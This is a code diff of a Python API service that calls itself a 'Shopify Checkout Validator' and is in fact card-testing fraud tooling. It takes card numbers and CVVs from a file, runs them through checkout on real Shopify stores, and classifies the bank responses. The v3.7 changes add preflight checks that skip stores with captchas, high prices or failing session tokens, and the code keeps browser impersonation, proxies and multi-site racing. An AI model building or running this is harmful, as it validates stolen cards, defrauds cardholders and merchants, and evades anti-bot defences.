@@ -1,15 +1,15 @@
 """
-Shopify Checkout Validator API — VPS Edition v3.5
+Shopify Checkout Validator API — VPS Edition v3.7
 
-New in v3.5:
-  - Real-time per-site health + /healthy-sites pool
-  - Auto-skip sites with no products (fast fail)
-  - /quarantine + /skip-site endpoints
-  - Optional `fallback_sites` param for in-request site retry
-  - chrome124 impersonation + UA-matched headers
-  - Warm-up homepage visit reduces captcha on strict stores
-  - Better session-token extraction for newer themes
-  - Cart fallback to direct /checkout on CART_FAILED
+Preflight checks (run BEFORE any card work):
+  - Session token: verify the site can produce a checkout session token
+    using its cheapest in-stock product. If not, skip the site.
+  - Captcha: verify the homepage has no bot challenge.
+  - Price ceiling: skip sites whose cheapest product > HARD_MAX_PRICE.
+  - No products: skip sites with empty /products.json.
+  - Blacklist: skip sites with >85% error rate (existing circuit breaker).
+
+All results cached for NO_PRODUCT_TTL seconds.
 """
 
 import asyncio
@@ -34,7 +34,7 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # ---------------------------------------------------------------------------
-# Config
+# Configuration
 # ---------------------------------------------------------------------------
 PORT                  = int(os.environ.get("PORT", 8080))
 WORKERS               = int(os.environ.get("WORKERS", 1))
@@ -42,6 +42,7 @@ CARDS_FILE            = os.environ.get("CARDS_FILE", "cards.txt")
 SITES_FILE            = os.environ.get("SITES_FILE", "sites.txt")
 MAX_PRICE             = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_AMOUNT            = float(os.environ.get("MIN_AMOUNT", 0.50))
+HARD_MAX_PRICE        = float(os.environ.get("HARD_MAX_PRICE", 20.0))
 SITE_CONCURRENCY      = int(os.environ.get("SITE_CONCURRENCY", 15))
 RACE_COUNT            = int(os.environ.get("RACE_COUNT", 3))
 BLACKLIST_THRESHOLD   = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
@@ -54,7 +55,7 @@ LOG_LEVEL             = os.environ.get("LOG_LEVEL", "warning").upper()
 LOG_FILE              = os.environ.get("LOG_FILE", "requests.txt")
 IMPERSONATE           = os.environ.get("IMPERSONATE", "chrome124")
 HEALTHY_MIN_SCORE     = float(os.environ.get("HEALTHY_MIN_SCORE", 0.20))
-NO_PRODUCT_TTL        = int(os.environ.get("NO_PRODUCT_TTL", 1800))  # 30 min
+NO_PRODUCT_TTL        = int(os.environ.get("NO_PRODUCT_TTL", 1800))
 
 VALID_API_KEYS = set(
     k.strip()
@@ -80,15 +81,14 @@ SITE_ERROR_CODES = frozenset({
     "NO_PRODUCT", "SUBMIT_FAILED", "NEGOTIATE_FAILED",
     "CHECKPOINTDENIED", "SESSION_EXPIRED", "ORDER_CREATION_FAILED",
     "NO_PAYMENT_REQUIRED", "TOKENIZATION_FAILED", "NO_PRODUCT_FOUND",
+    "PRICE_TOO_HIGH",
 })
 
-# Codes that indicate the site itself is unusable (as opposed to transient).
 HARD_DEAD_CODES = frozenset({
     "NO_PRODUCT", "NO_PRODUCT_FOUND", "SITE_REQUIRES_LOGIN",
-    "NO_SHOPIFY_PAYMENTS_GATEWAY",
+    "NO_SHOPIFY_PAYMENTS_GATEWAY", "PRICE_TOO_HIGH",
 })
 
-# Codes that mean the card flow should stop trying alternate sites.
 FINAL_CODES = frozenset({
     "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
     "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
@@ -208,7 +208,7 @@ class LoggedSession:
 
 
 # ---------------------------------------------------------------------------
-# GraphQL queries (same as before, unchanged)
+# GraphQL queries
 # ---------------------------------------------------------------------------
 _PROPOSAL_VARS = (
     "$sessionInput:SessionTokenInput!,"
@@ -420,13 +420,18 @@ _site_stats: dict[str, dict] = defaultdict(lambda: {
     "error_count":         0,
 })
 
-# Real-time quarantine / product tracking
 _site_quarantine: dict[str, dict] = defaultdict(lambda: {
     "count":                    0,
     "last_response":            "",
     "last_seen":                0.0,
     "has_products":             None,
     "has_products_checked_at":  0.0,
+    "cheapest_price":           None,
+    "cheapest_checked_at":      0.0,
+    "has_captcha":              None,
+    "captcha_checked_at":       0.0,
+    "can_create_session":       None,
+    "session_checked_at":       0.0,
     "last_success_at":          0.0,
 })
 
@@ -439,7 +444,6 @@ _product_cache: dict[str, dict] = {}
 _cards_cache: list[dict] = []
 _cards_loaded_at: float = 0.0
 
-# Live site pool refreshed from SITES_FILE
 _site_pool: list[str] = []
 _site_pool_loaded_at: float = 0.0
 
@@ -458,8 +462,9 @@ async def lifespan(app: FastAPI):
     _reload_cards()
     _reload_site_pool()
     log.warning(
-        "Shopify Validator API v3.5 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s",
-        SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool), IMPERSONATE,
+        "Shopify Validator API v3.7 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f",
+        SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool),
+        IMPERSONATE, HARD_MAX_PRICE,
     )
     asyncio.create_task(_warmup_sites())
     asyncio.create_task(_pool_refresher())
@@ -470,7 +475,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.5.0", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="3.7.0", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -494,7 +499,6 @@ def _reload_site_pool() -> None:
 
 
 async def _pool_refresher() -> None:
-    """Reload SITES_FILE every 5 minutes so newly added sites are picked up."""
     while True:
         await asyncio.sleep(300)
         try:
@@ -638,7 +642,6 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
         ("sessionToken&quot;:&quot;",   "&quot;"),
         ('data-session-token="',         '"'),
         ('"checkout_session_token":"',   '"'),
-        # Newer themes
         ('"checkoutSessionToken":"',     '"'),
         ('checkoutSessionToken&quot;:&quot;', "&quot;"),
         ('data-checkout-session-token="', '"'),
@@ -654,7 +657,6 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
 
 
 def _ua_headers(ua: str) -> dict:
-    """Return headers matched to the given User-Agent."""
     if "Firefox" in ua:
         return {
             "User-Agent": ua,
@@ -776,8 +778,55 @@ def _is_site_available(hostname: str) -> bool:
     return time.time() >= s.get("blacklisted_until", 0)
 
 
+def _site_usable(hostname: str) -> tuple[bool, str]:
+    """
+    Unified fast-fail check. Returns (usable, reason) where reason is
+    always one of:
+      ""                                     — proceed
+      "SITE_ERROR: blacklisted"              — circuit breaker tripped
+      "NO_PRODUCT"                           — no in-stock variants
+      "CAPTCHA_REQUIRED"                     — homepage shows a bot challenge
+      "PRICE_TOO_HIGH: cheapest $X > $Y"     — cheapest product > HARD_MAX_PRICE
+      "NO_SESSION_TOKEN"                     — site can't produce a checkout session
+    """
+    now = time.time()
+
+    # Circuit breaker
+    if not _is_site_available(hostname):
+        return False, "SITE_ERROR: blacklisted"
+
+    q = _site_quarantine.get(hostname)
+    if not q:
+        return True, ""
+
+    # No products
+    if q.get("has_products") is False:
+        age = now - q.get("has_products_checked_at", 0)
+        if age < NO_PRODUCT_TTL:
+            return False, "NO_PRODUCT"
+
+    # Captcha
+    if q.get("has_captcha") is True:
+        age = now - q.get("captcha_checked_at", 0)
+        if age < NO_PRODUCT_TTL:
+            return False, "CAPTCHA_REQUIRED"
+
+    # Price ceiling
+    cp = q.get("cheapest_price")
+    cpa = q.get("cheapest_checked_at", 0)
+    if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
+        return False, f"PRICE_TOO_HIGH: cheapest ${cp:.2f} > ${HARD_MAX_PRICE:.2f}"
+
+    # Session token
+    if q.get("can_create_session") is False:
+        age = now - q.get("session_checked_at", 0)
+        if age < NO_PRODUCT_TTL:
+            return False, "NO_SESSION_TOKEN"
+
+    return True, ""
+
+
 def _site_has_products(hostname: str) -> Optional[bool]:
-    """Return True/False/None based on recent product fetch."""
     q = _site_quarantine.get(hostname)
     if not q:
         return None
@@ -811,6 +860,17 @@ def _record_site_result(hostname: str, response_code: str) -> None:
     q["last_response"] = response_code
     q["last_seen"] = time.time()
 
+    if response_code == "CAPTCHA_REQUIRED":
+        q["has_captcha"] = True
+        q["captcha_checked_at"] = time.time()
+
+    if response_code == "PRICE_TOO_HIGH":
+        q["cheapest_checked_at"] = time.time()
+
+    if response_code == "NO_SESSION_TOKEN":
+        q["can_create_session"] = False
+        q["session_checked_at"] = time.time()
+
     if response_code in HARD_DEAD_CODES:
         q["count"] += 1
         if response_code in ("NO_PRODUCT", "NO_PRODUCT_FOUND"):
@@ -818,7 +878,6 @@ def _record_site_result(hostname: str, response_code: str) -> None:
             q["has_products_checked_at"] = time.time()
     elif response_code not in SITE_ERROR_CODES:
         q["last_success_at"] = time.time()
-        # A successful flow implies products exist
         if response_code in FINAL_CODES:
             q["has_products"] = True
             q["has_products_checked_at"] = time.time()
@@ -847,7 +906,130 @@ def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dic
 
 
 # ---------------------------------------------------------------------------
-# Product fetching
+# Captcha preflight
+# ---------------------------------------------------------------------------
+async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
+    """
+    Fetch the storefront homepage and look for bot-challenge markers.
+    Only checks the first 12 KB of HTML so it's fast.
+    """
+    try:
+        r = await session.get(
+            base_url,
+            allow_redirects=True,
+            timeout=12,
+            headers=_ua_headers(random.choice(USER_AGENTS)),
+        )
+        if r.status_code != 200:
+            return False
+        text = (r.text or "")[:12000].lower()
+        indicators = (
+            "hcaptcha",
+            "recaptcha",
+            "g-recaptcha",
+            "cf-challenge",
+            "challenge-platform",
+            "checkpoint.challenge",
+            "captcha_required",
+            "please verify you are a human",
+            "verify you are human",
+            "press & hold",
+            "press and hold",
+            "are you a robot",
+            "one more step",
+        )
+        return any(k in text for k in indicators)
+    except Exception as ex:
+        log.debug("[_site_has_captcha] %s -> %s", base_url, ex)
+        return False
+
+
+# ---------------------------------------------------------------------------
+# Session-token preflight
+# ---------------------------------------------------------------------------
+async def _check_session_creation(
+    base_url: str,
+    variant_id: str,
+    session: LoggedSession,
+) -> bool:
+    """
+    Test whether the site can produce a checkout session token WITHOUT
+    using any card. Only steps 1-2 of the normal flow are executed:
+
+      POST /cart/add.js  with the cheapest variant
+      POST /checkout/    and try to extract X-Checkout-One-Session-Token
+
+    Returns True on success, False on any failure (missing token, cart
+    blocked, redirect to login, timeout, etc.).
+    """
+    if not variant_id:
+        return False
+
+    ua = random.choice(USER_AGENTS)
+    base_headers = {
+        "User-Agent": ua,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json",
+        "Origin": base_url,
+        "Referer": f"{base_url}/",
+    }
+
+    try:
+        # 1. Add the cheapest variant to cart
+        cart_ok = False
+        for payload, ct in [
+            (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
+            (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
+        ]:
+            try:
+                r = await session.post(
+                    f"{base_url}/cart/add.js",
+                    data=payload,
+                    headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
+                    timeout=12,
+                )
+                if r.status_code == 200:
+                    cart_ok = True
+                    break
+            except Exception:
+                continue
+
+        if not cart_ok:
+            return False
+
+        # 2. Fetch the checkout page
+        try:
+            cr = await session.post(
+                f"{base_url}/checkout/",
+                allow_redirects=True,
+                headers={
+                    **base_headers,
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                },
+                timeout=15,
+            )
+        except Exception:
+            return False
+
+        if cr.status_code != 200:
+            return False
+
+        checkout_url = str(cr.url).lower()
+        if "login" in checkout_url or "/account" in checkout_url or "password" in checkout_url:
+            return False
+
+        # 3. Extract session token from headers or HTML
+        sst = _extract_sst(cr.text or "", dict(cr.headers))
+        return bool(sst)
+
+    except Exception as ex:
+        log.debug("[_check_session_creation] %s -> %s", base_url, ex)
+        return False
+
+
+# ---------------------------------------------------------------------------
+# Product fetching (with all preflight checks)
 # ---------------------------------------------------------------------------
 async def _fetch_products(
     base_url: str,
@@ -924,7 +1106,6 @@ async def _fetch_products(
                         if price <= max_price:
                             candidates.append(entry)
 
-            # Track has_products in real time
             q = _site_quarantine[hostname]
             q["has_products"] = bool(candidates or cheapest_any)
             q["has_products_checked_at"] = time.time()
@@ -932,6 +1113,56 @@ async def _fetch_products(
             if not candidates and cheapest_any is None:
                 _product_cache[hostname] = {"product": None, "candidates": [], "err": "No products found", "ts": now}
                 return None, [], "No products found"
+
+            # ── Preflight 1: captcha ────────────────────────────────────
+            last_cap_check = q.get("captcha_checked_at", 0)
+            if (now - last_cap_check) > NO_PRODUCT_TTL:
+                captcha = await _site_has_captcha(base_url, session)
+                q["has_captcha"] = captcha
+                q["captcha_checked_at"] = now
+                if captcha:
+                    log.warning("[preflight] %s has captcha — skipping site", hostname)
+
+            if q.get("has_captcha") is True:
+                err = "CAPTCHA_REQUIRED"
+                _product_cache[hostname] = {
+                    "product": None, "candidates": [], "err": err, "ts": now,
+                }
+                return None, [], err
+
+            # ── Preflight 2: price ceiling ──────────────────────────────
+            if cheapest_any_price != float("inf"):
+                q["cheapest_price"] = cheapest_any_price
+                q["cheapest_checked_at"] = now
+                if cheapest_any_price > HARD_MAX_PRICE:
+                    err = f"PRICE_TOO_HIGH: cheapest ${cheapest_any_price:.2f} > ${HARD_MAX_PRICE:.2f}"
+                    q["has_products"] = False
+                    q["has_products_checked_at"] = now
+                    log.warning("[preflight] %s cheapest $%.2f > $%.2f — skipping site",
+                                hostname, cheapest_any_price, HARD_MAX_PRICE)
+                    _product_cache[hostname] = {
+                        "product": None, "candidates": [], "err": err, "ts": now,
+                    }
+                    return None, [], err
+
+            # ── Preflight 3: session token ──────────────────────────────
+            if cheapest_any is not None:
+                last_st_check = q.get("session_checked_at", 0)
+                if (now - last_st_check) > NO_PRODUCT_TTL:
+                    can_session = await _check_session_creation(
+                        base_url, cheapest_any["variant_id"], session
+                    )
+                    q["can_create_session"] = can_session
+                    q["session_checked_at"] = now
+                    if not can_session:
+                        log.warning("[preflight] %s cannot create session token — skipping site", hostname)
+
+                if q.get("can_create_session") is False:
+                    err = "NO_SESSION_TOKEN"
+                    _product_cache[hostname] = {
+                        "product": None, "candidates": [], "err": err, "ts": now,
+                    }
+                    return None, [], err
 
             if not candidates:
                 candidates = [cheapest_any]
@@ -1010,17 +1241,11 @@ async def validate_card(
             "Retry":        is_site_error,
         }
 
-    # Fast fail 1: blacklisted
-    if not _is_site_available(hostname):
-        return _r("SITE_ERROR",
-                  message=f"Site {hostname} is temporarily blacklisted",
-                  is_site_error=True)
-
-    # Fast fail 2: known no-products
-    if _site_has_products(hostname) is False:
-        return _r("NO_PRODUCT",
-                  message="Site has no products (cached)",
-                  is_site_error=True)
+    # Single fast-fail gate (blacklist, no-products, captcha, price, session)
+    usable, reason = _site_usable(hostname)
+    if not usable:
+        code = reason.split(":")[0].strip() if ":" in reason else reason
+        return _r(code, message=reason, is_site_error=True)
 
     sem = _site_semaphores[hostname]
     session, owned = _make_session(proxy_str)
@@ -1036,7 +1261,7 @@ async def validate_card(
             state = addr["zoneCode"]
             s_zip = addr["postalCode"]
 
-            # Warm-up homepage (Fix: reduces captcha on strict stores)
+            # Warm-up homepage
             try:
                 await session.get(ourl, headers=_ua_headers(ua),
                                   allow_redirects=True, timeout=10)
@@ -1057,8 +1282,21 @@ async def validate_card(
                     ourl, proxy_str, max_price=effective_max_price, session=session,
                 )
                 if not all_candidates and not best:
-                    return _r(f"NO_PRODUCT: {err or 'No products available'}",
-                              message=err or "No products",
+                    err_str = (err or "No products available")
+                    if err_str == "CAPTCHA_REQUIRED":
+                        return _r("CAPTCHA_REQUIRED",
+                                  message="Site has captcha (preflight)",
+                                  is_site_error=True)
+                    if err_str == "NO_SESSION_TOKEN":
+                        return _r("NO_SESSION_TOKEN",
+                                  message="Site cannot create session token (preflight)",
+                                  is_site_error=True)
+                    if err_str.startswith("PRICE_TOO_HIGH"):
+                        return _r("PRICE_TOO_HIGH",
+                                  message=err_str,
+                                  is_site_error=True)
+                    return _r(f"NO_PRODUCT: {err_str}",
+                              message=err_str,
                               is_site_error=True)
 
                 pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
@@ -1122,7 +1360,6 @@ async def validate_card(
                     continue
 
             if not cart_added:
-                # Fallback: go straight to /checkout (some themes)
                 try:
                     r = await session.get(f"{ourl}/checkout", allow_redirects=True,
                                           headers=_ua_headers(ua))
@@ -1838,10 +2075,8 @@ async def validate_card_raced(
         return {"Response": "SITE_ERROR", "Message": "No sites provided",
                 "Status": False, "Retry": True}
 
-    live_sites = [s for s in sites if _is_site_available(urlparse(
-        s if s.startswith("http") else f"https://{s}").netloc)
-        and _site_has_products(urlparse(
-        s if s.startswith("http") else f"https://{s}").netloc) is not False]
+    live_sites = [s for s in sites if _site_usable(urlparse(
+        s if s.startswith("http") else f"https://{s}").netloc)[0]]
     pool = live_sites if live_sites else sites
     random.shuffle(pool)
     picked = pool[: max(1, race_count)]
@@ -1884,10 +2119,6 @@ async def _try_sites_in_order(
     cc, month, year, cvv, sites: list[str],
     proxy_str=None, max_price=None,
 ) -> dict:
-    """
-    Try each site in order until one returns a FINAL code. Skips NO_PRODUCT
-    sites quickly and moves to the next one. Used for auto-skip behaviour.
-    """
     last_result = None
     for site in sites:
         result = await validate_card(cc, month, year, cvv, site,
@@ -1898,7 +2129,6 @@ async def _try_sites_in_order(
         _record_site_result(host, code)
         if code in FINAL_CODES:
             return result
-        # Otherwise, keep trying next site
     return last_result or {
         "Response": "SITE_ERROR", "Message": "All sites exhausted",
         "Status": False, "Retry": True,
@@ -1914,12 +2144,6 @@ async def shopify_route(
     key:            Optional[str] = Query(None),
     fallback_sites: Optional[str] = Query(None, description="Comma-separated alternates"),
 ):
-    """
-    Validate a card against a Shopify store.
-    If `fallback_sites` is provided, and the primary site returns
-    NO_PRODUCT / SITE_ERROR / CAPTCHA etc., the API tries each fallback
-    in order until one returns a real card response.
-    """
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
         return JSONResponse(
             {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
@@ -1938,13 +2162,11 @@ async def shopify_route(
             return JSONResponse({"error": "No cards available."}, status_code=400)
         card = random.choice(cards)
 
-    # Build site list
     sites_to_try = [site]
     if fallback_sites:
         sites_to_try += [s.strip() for s in fallback_sites.split(",") if s.strip()]
 
     if len(sites_to_try) == 1:
-        # Fast path
         result = await validate_card(
             card["cc"], card["month"], card["year"], card["cvv"],
             site, proxy_str=proxy, max_price=max_price,
@@ -1952,7 +2174,6 @@ async def shopify_route(
         host = urlparse(site if site.startswith("http") else f"https://{site}").netloc
         _record_site_result(host, result.get("Response", "UNKNOWN"))
     else:
-        # Auto-skip mode
         result = await _try_sites_in_order(
             card["cc"], card["month"], card["year"], card["cvv"],
             sites_to_try, proxy_str=proxy, max_price=max_price,
@@ -2051,10 +2272,6 @@ async def check_route(
 # ── REAL-TIME site stats ────────────────────────────────────────────────────
 @app.get("/site-stats")
 async def site_stats_route():
-    """
-    Real-time per-site health. Refreshed on every request; every card
-    check updates the underlying data.
-    """
     now = time.time()
     out = {}
     hosts = set(list(_site_stats.keys()) + list(_site_quarantine.keys()))
@@ -2073,6 +2290,25 @@ async def site_stats_route():
 
         blacklisted = now < s.get("blacklisted_until", 0)
 
+        cp = q.get("cheapest_price")
+        cpa = q.get("cheapest_checked_at")
+        hc = q.get("has_captcha")
+        hca = q.get("captcha_checked_at")
+        cs = q.get("can_create_session")
+        csa = q.get("session_checked_at")
+
+        skip_reason = None
+        if blacklisted:
+            skip_reason = "blacklisted"
+        elif hc is True and hca and (now - hca) < NO_PRODUCT_TTL:
+            skip_reason = "captcha"
+        elif cp is not None and cp > HARD_MAX_PRICE and cpa and (now - cpa) < NO_PRODUCT_TTL:
+            skip_reason = f"price_too_high (${cp:.2f})"
+        elif cs is False and csa and (now - csa) < NO_PRODUCT_TTL:
+            skip_reason = "no_session_token"
+        elif hp is False and (now - (q.get("has_products_checked_at") or 0)) < NO_PRODUCT_TTL:
+            skip_reason = "no_products"
+
         out[host] = {
             "samples":              total,
             "success_rate":         f"{success_rate:.1f}%" if success_rate is not None else "N/A",
@@ -2083,10 +2319,17 @@ async def site_stats_route():
             "blacklist_remaining":  max(0, int(s.get("blacklisted_until", 0) - now)),
             "has_products":         hp,
             "has_products_age_sec": hp_age,
+            "cheapest_price":       cp,
+            "cheapest_age_sec":     int(now - cpa) if cpa else None,
+            "has_captcha":          hc,
+            "captcha_age_sec":      int(now - hca) if hca else None,
+            "can_create_session":   cs,
+            "session_age_sec":      int(now - csa) if csa else None,
+            "skip_reason":          skip_reason,
             "last_response":        q.get("last_response", ""),
             "last_seen_ago_sec":    last_seen_ago,
             "quarantine_hits":      q.get("count", 0),
-            "live":                 (not blacklisted) and (hp is not False),
+            "live":                 skip_reason is None,
         }
     return JSONResponse(out)
 
@@ -2094,12 +2337,6 @@ async def site_stats_route():
 # ── HEALTHY SITES POOL ──────────────────────────────────────────────────────
 @app.get("/healthy-sites")
 async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
-    """
-    Return sites that are currently usable:
-      - Not blacklisted
-      - has_products is True (or unknown and previously worked)
-      - Success rate (if enough samples) >= min_score
-    """
     now = time.time()
     out = []
     seen = set()
@@ -2113,17 +2350,25 @@ async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
         s = _site_stats.get(host)
         q = _site_quarantine.get(host, {})
 
-        # Skip blacklisted
         if s and now < s.get("blacklisted_until", 0):
             continue
 
-        # Skip known no-products
         hp = q.get("has_products")
         hpc = q.get("has_products_checked_at", 0)
         if hp is False and (now - hpc) < NO_PRODUCT_TTL:
             continue
 
-        # Skip low success rate (only if enough samples)
+        if q.get("has_captcha") is True and (now - q.get("captcha_checked_at", 0)) < NO_PRODUCT_TTL:
+            continue
+
+        cp = q.get("cheapest_price")
+        cpa = q.get("cheapest_checked_at", 0)
+        if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
+            continue
+
+        if q.get("can_create_session") is False and (now - q.get("session_checked_at", 0)) < NO_PRODUCT_TTL:
+            continue
+
         if s:
             outcomes = list(s.get("outcomes", []))
             if len(outcomes) >= 5:
@@ -2144,7 +2389,6 @@ async def healthy_sites_route(min_score: float = HEALTHY_MIN_SCORE):
 # ── QUARANTINE ──────────────────────────────────────────────────────────────
 @app.get("/quarantine")
 async def quarantine_route(min_hits: int = 3):
-    """Sites that have repeatedly returned hard-dead codes. Safe to delete."""
     out = {}
     for host, q in _site_quarantine.items():
         if q.get("count", 0) >= min_hits and q.get("last_response") in HARD_DEAD_CODES:
@@ -2158,7 +2402,6 @@ async def quarantine_route(min_hits: int = 3):
 
 @app.post("/skip-site")
 async def skip_site_route(site: str = Query(...)):
-    """Manually mark a site as dead (excluded from /healthy-sites)."""
     host = urlparse(site if site.startswith("http") else f"https://{site}").netloc
     q = _site_quarantine[host]
     q["count"] = q.get("count", 0) + 1
@@ -2174,24 +2417,32 @@ async def skip_site_route(site: str = Query(...)):
 async def health_route():
     cards = _get_cards()
     return JSONResponse({
-        "status":            "ok",
-        "version":           "3.5.0",
-        "cards_loaded":      len(cards),
-        "site_concurrency":  SITE_CONCURRENCY,
-        "cache_ttl":         CACHE_TTL,
-        "variant_ttl":       VARIANT_TTL,
-        "max_price":         MAX_PRICE,
-        "min_amount":        MIN_AMOUNT,
-        "race_count":        RACE_COUNT,
-        "impersonate":       IMPERSONATE,
-        "keys_configured":   len(VALID_API_KEYS),
-        "pool_size":         len(_site_pool),
-        "cached_products":   len(_product_cache),
-        "cached_variants":   len(_variant_cache),
-        "blacklisted_sites": sum(1 for s in _site_stats.values()
-                                  if time.time() < s.get("blacklisted_until", 0)),
-        "no_product_sites":  sum(1 for q in _site_quarantine.values()
-                                  if q.get("has_products") is False),
+        "status":               "ok",
+        "version":              "3.7.0",
+        "cards_loaded":         len(cards),
+        "site_concurrency":     SITE_CONCURRENCY,
+        "cache_ttl":            CACHE_TTL,
+        "variant_ttl":          VARIANT_TTL,
+        "max_price":            MAX_PRICE,
+        "min_amount":           MIN_AMOUNT,
+        "hard_max_price":       HARD_MAX_PRICE,
+        "race_count":           RACE_COUNT,
+        "impersonate":          IMPERSONATE,
+        "keys_configured":      len(VALID_API_KEYS),
+        "pool_size":            len(_site_pool),
+        "cached_products":      len(_product_cache),
+        "cached_variants":      len(_variant_cache),
+        "blacklisted_sites":    sum(1 for s in _site_stats.values()
+                                     if time.time() < s.get("blacklisted_until", 0)),
+        "no_product_sites":     sum(1 for q in _site_quarantine.values()
+                                     if q.get("has_products") is False),
+        "captcha_sites":        sum(1 for q in _site_quarantine.values()
+                                     if q.get("has_captcha") is True),
+        "price_too_high_sites": sum(1 for q in _site_quarantine.values()
+                                     if q.get("cheapest_price") is not None
+                                     and q.get("cheapest_price") > HARD_MAX_PRICE),
+        "session_fail_sites":   sum(1 for q in _site_quarantine.values()
+                                     if q.get("can_create_session") is False),
     })
 
 
